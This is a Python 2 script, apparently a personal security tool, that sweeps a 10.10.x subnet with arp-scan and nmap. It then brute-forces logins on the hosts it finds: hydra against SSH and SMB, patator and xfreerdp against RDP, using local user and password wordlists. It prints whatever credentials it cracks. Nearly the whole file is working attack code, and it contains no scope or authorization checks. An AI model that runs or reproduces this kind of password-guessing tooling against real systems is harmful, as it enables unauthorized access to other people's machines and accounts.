import subprocess
import argparse
import os
import sys
import time
import string

# the list of the op: 10.10.8.4/16 will use test all network.
parser = argparse.ArgumentParser(description='Set the IP address list')
parser.add_argument('--ip', dest='IPLIST', required=True)
args = parser.parse_args()

IPLIST = args.IPLIST

def executor(cmd=None, debug=True):
    # type: (object) -> object
    if cmd is None:
        return Exception('The cmd is not received')
    if debug:
        print('cmd is : %s' % cmd)
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                         stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    (output, err) = p.communicate(input="{}\n".format("Y"))
    # (output, err) = p.communicate()
    if debug:
        print(output)
        print(err)
    if p.poll() is 0:
        return output
    else:
        return Exception('There is non 0 exit code (%s) for the %s', (p.poll(), cmd))

def output(cmd=None, debug=True):
    # type: (object) -> object
    if cmd is None:
        return Exception('The cmd is not received')
    if debug:
        print('cmd is : %s' % cmd)
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                         stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    (output, err) = p.communicate(input="{}\n".format("Y"))
    # (output, err) = p.communicate()
    if debug:
        print(output)
        print(err)
    if output:
        return output
    if err:
        return err

def get_network_interface():
    interface = executor(cmd="ip addr show | grep 10.10.255.255 | awk '{print $NF}'", debug=False)
    return str(interface).strip('\n')

def list_active_ip():
    if get_network_interface():
        return executor(cmd="arp-scan --interface=" + get_network_interface() + " -N -g %s | grep 10.10. | awk '{print $1}'" %IPLIST, debug=False)


print get_network_interface()
list_active_ip()

ssh = []
rdp = []
smb = []
http_proxy = {}


def get_open_ports():

    # ssh = []
    # rdp = []
    # smb = []
    # http_proxy = {}

    result = list_active_ip()
    i = 0
    for ip in result.splitlines():
        print('Working with the %s machine from %s and the IP is %s' % (i, len(result.splitlines()), ip))
        machine_ports = executor(cmd="nmap -p 22,445,3389,8006,8080 %s" % ip, debug=False)
        # print machine_ports
        for line in machine_ports.splitlines():
            if 'open' in line:
                if 'ms-wbt-server' in line:
                    rdp.append(ip)
                if 'ssh' in line:
                    ssh.append(ip)
                if 'http-proxy' in line:
                    port = line.split('/')[0]         #8080/tcp open  http-proxy  -> 8080
                    http_proxy[ip] = port             #Create new record in the dictionary with value of the port
                if 'microsoft-ds' in line:
                    smb.append(ip)
        i += 1
    print("The are found ssh open port on the next machines %s" % ssh)
    print("The are found rdp open port on the next machines %s" % rdp)
    print("The are found smb open port on the next machines %s" % smb)
    print("The are found http-proxy open ports on the next machines and the values of the ports are:")
    for x in http_proxy:
        print x, http_proxy[x]

get_open_ports()

result_ssh = {}
result_rdp = {}
result_smb = {}



def test_open():

    item = None

    if ssh:
        for i in ssh:
            item = executor(cmd="hydra -L /home/mbugaiov/Documents/sec/user.txt -P /home/mbugaiov/Documents/sec/pass.txt -t 4 -f ssh://%s | grep host: | awk {'print $5, $7'}" %i)
            if item:
                result_ssh[i] = item
    if rdp:
        for i in rdp:
            if os.path.isdir('/usr/share/patator/ggg/logs'):
                executor(cmd='sudo rm -rf /usr/share/patator/ggg/logs', debug=False)
            # if os.path.isfile(path='/usr/share/patator/ggg/RESULTS.csv'):
            #     executor(cmd='rm -rf /usr/share/patator/ggg/RESULTS.csv')
            counter = 0
            while 'reset' in output(cmd='xfreerdp +auth-only /u:administrator /p:linux /v:%s:3389' %i, debug=False) and counter < 12 :
                print('Waiting 10 sec while the connection reset by peer for the %s' %i)
                time.sleep(10)
                counter += 1
            else:
                pass
                # print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
                # print output(cmd='xfreerdp +auth-only /u:administrator /p:linux /v:%s:3389' %i, debug=False)
                # print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')

            executor("sudo python2.7 /usr/share/patator/patator.py rdp_login host=%s user=FILE0 0=/home/mbugaiov/Documents/sec/user.txt password=FILE1 1=/home/mbugaiov/Documents/sec/pass.txt -x ignore:code=1 -l /usr/share/patator/ggg/logs" %i, debug=False)
            if os.path.isfile('/usr/share/patator/ggg/logs/RESULTS.csv'):
                item = executor(cmd="cat /usr/share/patator/ggg/logs/RESULTS.csv | grep INFO,0 | awk -F',' '{print $6}'", debug=False)
            if item:
                result_rdp[i] = item
    if smb:
        for i in smb:
            item = executor(cmd="hydra -L /home/mbugaiov/Documents/sec/user.txt -P /home/mbugaiov/Documents/sec/pass.txt -t 1 -f smb://%s | grep host: | awk {'print $5, $7'}" %i)
            if item:
                result_smb[i] = item

test_open()
if result_ssh:
    for x in result_ssh:
        print "ssh port is: %s , %s" % (x, result_ssh[x])
if result_smb:
    for x in result_smb:
        print "smb port is: %s , %s" % (x, result_smb[x])
if result_rdp:
    for x in result_rdp:
        print "rdp port is: %s , %s" % (x, result_rdp[x])
